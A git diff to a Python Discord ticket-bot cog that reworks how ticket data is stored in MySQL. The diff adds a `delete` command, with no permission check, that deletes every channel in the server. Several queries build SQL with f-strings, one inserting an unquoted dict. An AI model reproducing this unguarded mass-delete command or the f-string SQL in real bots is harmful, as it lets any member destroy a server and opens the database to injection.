@@ -37,6 +37,11 @@ class Ticket(commands.Cog):
         await self.ready_db()
         await self.insert_ticket_db(guild=ctx.guild)
 
+    @commands.command()
+    async def delete(self, ctx):
+        for channel in ctx.guild.channels:
+            await channel.delete()
+
     @commands.command(aliases=['pan'], description='SUDO', pass_context=True, hidden=True)
     async def create_reaction_panel(self, ctx):
         embed = discord.Embed(title="Apri un Ticket!", description='Clicca la letterina della posta 📩 sotto',
@@ -80,11 +85,10 @@ class Ticket(commands.Cog):
                                                         'ticket_general_log_channel': y['ticket_general_log_channel'],
                                                         'ticket_count': y['ticket_count'],
                                                         'ticket_settings': y['ticket_settings'],
-                                                        'ticket_reaction_lock_ids': y['ticket_reaction_lock_ids'],
-                                                        'ticket_support_roles': y['ticket_support_roles'],
-                                                        'ticket_owner_id': literal_eval(y['ticket_owner_id']) if y[
-                                                            'ticket_owner_id'] else None,
-                                                        'ticket_closer_user_id': y['ticket_closer_user_id']
+                                                        'ticket_reaction_lock_ids': literal_eval(y['ticket_reaction_lock_ids']),
+                                                        'ticket_support_roles': literal_eval(y['ticket_support_roles']),
+                                                        'ticket_owner_id': literal_eval(y['ticket_owner_id']),
+                                                        'ticket_closer_user_id': literal_eval(y['ticket_closer_user_id'])
                                                         }
         else:
             await cursor.execute(f'SELECT * FROM datacenter WHERE server_id = {only_guild};')
@@ -97,11 +101,10 @@ class Ticket(commands.Cog):
                                                     'ticket_general_log_channel': y['ticket_general_log_channel'],
                                                     'ticket_count': y['ticket_count'],
                                                     'ticket_settings': y['ticket_settings'],
-                                                    'ticket_reaction_lock_ids': y['ticket_reaction_lock_ids'],
-                                                    'ticket_support_roles': y['ticket_support_roles'],
-                                                    'ticket_owner_id': literal_eval(y['ticket_owner_id']) if y[
-                                                        'ticket_owner_id'] else None,
-                                                    'ticket_closer_user_id': y['ticket_closer_user_id']
+                                                    'ticket_reaction_lock_ids': literal_eval(y['ticket_reaction_lock_ids']),
+                                                    'ticket_support_roles': literal_eval(y['ticket_support_roles']),
+                                                    'ticket_owner_id': literal_eval(y['ticket_owner_id']),
+                                                    'ticket_closer_user_id': literal_eval(y['ticket_closer_user_id'])
                                                     }
         disconn.close()
 
@@ -135,6 +138,8 @@ class Ticket(commands.Cog):
         ticket_count = self.db_offline[guild_id]['ticket_count'] + 1
         ticket_settings = self.db_offline[guild_id]['ticket_settings']
         ticket_support_roles = self.db_offline[guild_id]['ticket_support_roles']
+        ticket_reaction_lock_ids = self.db_offline[guild_id]['ticket_reaction_lock_ids']
+        print(type(ticket_reaction_lock_ids))
 
         overwrites = {
             guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False,)
@@ -149,8 +154,11 @@ class Ticket(commands.Cog):
                                                   reason=None)
         embed = discord.Embed(title="", description=ticket_settings,
                               colour=discord.Colour.green())
-        ticket_reaction_lock_ids = await channel.send(embed=embed)
-        await ticket_reaction_lock_ids.add_reaction('🔒')
+        message = await channel.send(embed=embed)
+
+        ticket_reaction_lock_ids[message.id] = channel.id
+
+        await message.add_reaction('🔒')
 
         disconn = await aiomysql.connect(host=host,
                                          port=port,
@@ -162,6 +170,7 @@ class Ticket(commands.Cog):
         await cursor.execute(f'UPDATE datacenter SET ticket_count = {ticket_count}, '
                              f'ticket_reaction_lock_ids = {ticket_reaction_lock_ids}'
                              f' WHERE server_id = {guild.id};')
+        await self.load_db_var(guild_id)
         disconn.close()
 
     async def ready_db(self):
@@ -196,11 +205,12 @@ class Ticket(commands.Cog):
         try:
             await cursor.execute("INSERT INTO datacenter (server_id, ticket_general_category_id, "
                                  "channel_id, message_id, open_reaction_emoji, message_settings, "
-                                 "ticket_general_log_channel, ticket_count, ticket_settings) "
-                                 "VALUES (%s, %s, %s, %s, %s, %s, %s,"
+                                 "ticket_general_log_channel, ticket_count, ticket_settings, ticket_reaction_lock_ids, "
+                                 "ticket_support_roles, ticket_owner_id, ticket_closer_user_id) "
+                                 "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s,"
                                  " %s, %s);", (guild.id, category.id, channel.id, message.id,
                                                '📩', str(ticket_set), channel_archive.id, 0,
-                                               ticket_settings))
+                                               ticket_settings, str({}), str([]), str({}), str({})))
             await self.load_db_var(only_guild=guild.id)
         except Exception as error:
             print(error)
